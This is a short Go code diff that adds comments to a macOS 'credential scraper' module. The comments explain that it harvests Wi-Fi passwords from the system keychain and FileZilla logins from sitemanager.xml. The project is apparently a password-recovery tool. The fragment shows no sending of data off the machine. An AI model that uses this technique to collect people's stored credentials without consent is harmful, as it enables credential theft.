@@ -1,5 +1,9 @@
 //go:build darwin
 
+// apps_darwin.go — macOS app credential scrapers (FileZilla, Wi‑Fi, …).
+//
+// Wi‑Fi passwords come from the system keychain via security(1); FileZilla
+// reads sitemanager.xml under Application Support.
 package scanner
 
 import (
@@ -13,6 +17,7 @@ import (
 	"recovery/recovery/types"
 )
 
+// ScanApps collects non-browser app credentials available on this Mac.
 func ScanApps() []types.AppCredentialResult {
 	var results []types.AppCredentialResult
 	results = append(results, scanFileZillaDarwin()...)
